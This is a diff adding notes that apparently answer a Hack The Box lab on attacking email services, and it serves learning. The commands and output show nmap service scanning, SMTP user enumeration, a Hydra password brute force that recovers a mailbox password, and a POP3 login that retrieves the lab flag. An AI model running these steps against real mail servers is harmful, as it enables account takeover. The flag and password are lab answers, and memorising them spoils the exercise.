@@ -367,5 +367,150 @@ datboyblu3@htb[/htb]# swaks --from notifications@inlanefreight.com --to employee
 <-  221 Bye
 === Connection closed with remote host.
 ```
+### Questions
+
+1. What is the available username for the domain inlanefreight.htb in the SMTP server?
+
+**NMAP**
+```
+nmap -Pn -sV --script smtp-open-relay 10.129.203.12 
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-21 15:36 EST
+Nmap scan report for 10.129.203.12
+Host is up (1.1s latency).
+Not shown: 994 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+25/tcp   open  smtp          hMailServer smtpd
+|_smtp-open-relay: Server isn't an open relay, authentication needed
+110/tcp  open  pop3          hMailServer pop3d
+143/tcp  open  imap          hMailServer imapd
+587/tcp  open  smtp          hMailServer smtpd
+|_smtp-open-relay: Server isn't an open relay, authentication needed
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: Host: WIN-02; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 109.82 seconds
+```
+
+**O365SPRAY - Tried using this tool, but the server is not utilizing O365**
+```
+python3 o365spray.py --enum -U ~/users.list --domain inlanefreight.htb
+
+            *** O365 Spray ***            
+
+>----------------------------------------<
+
+   > version        :  3.0.4
+   > domain         :  inlanefreight.htb
+   > enum           :  True
+   > userfile       :  /home/dan/users.list
+   > validate_module:  getuserrealm
+   > enum_module    :  oauth2
+   > rate           :  10 threads
+   > poolsize       :  10000
+   > timeout        :  25 seconds
+   > start          :  2023-12-21 15:59:59
+
+>----------------------------------------<
+
+[2023-12-21 15:59:59,385] info | Validating: inlanefreight.htb
+[2023-12-21 16:00:00,126] info | [FAILED] The following domain does not appear to be using O365: inlanefreight.htb
+```
+
+**SMTP-ENUM SCRIPT** - User found: marlin
+```
+└─$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... users.list
+Target count ............. 1
+Username count ........... 10
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ inlanefreight.htb
+
+######## Scan started at Thu Dec 21 16:21:19 2023 #########
+10.129.203.12: marlin@inlanefreight.htb exists
+######## Scan completed at Thu Dec 21 16:21:20 2023 #########
+1 results.
+
+10 queries in 1 seconds (10.0 queries / sec)
+
+```
+
+2. Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.
+
+**Get password via Hydra**
+```
+$ hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.203.12 smtp 
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-21 16:47:39
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 333 login tries (l:1/p:333), ~21 tries per task
+[DATA] attacking smtp://10.129.203.12:25/
+[25][smtp] host: 10.129.203.12   login: marlin@inlanefreight.htb   password: poohbear
+[STATUS] attack finished for 10.129.203.12 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-21 16:48:13
+
+```
+**password: poohbear**
+
+**Now log into the email server:**
+
+Use the command `list` to list the numbered email messages. And `retr 1` to display the contents of the first message
+```
+
+telnet 10.129.203.12 110
+Trying 10.129.203.12...
+Connected to 10.129.203.12.
+Escape character is '^]'.
++OK POP3
+USER marlin@inlanefreight.htb                                   
++OK Send your password
+PASS poohbear
++OK Mailbox locked and ready
+list
++OK 1 messages (601 octets)
+1 601
+.
+retr 1
++OK 601 octets
+Return-Path: marlin@inlanefreight.htb
+Received: from [10.10.14.33] (Unknown [10.10.14.33])
+        by WINSRV02 with ESMTPA
+        ; Wed, 20 Apr 2022 14:49:32 -0500
+Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
+Subject: Password change
+From: marlin <marlin@inlanefreight.htb>
+To: administrator@inlanefreight.htb
+Cc: marlin@inlanefreight.htb
+Date: Wed, 20 Apr 2022 15:49:11 -0400
+Content-Type: text/plain; charset="UTF-8"
+User-Agent: Evolution 3.38.3-1 
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+Hi admin,
+
+How can I change my password to something more secure? 
+
+flag: HTB{w34k_p4$$w0rd}
 
 
+.
+quit
++OK POP3 server saying goodbye...
+Connection closed by foreign host.
+```
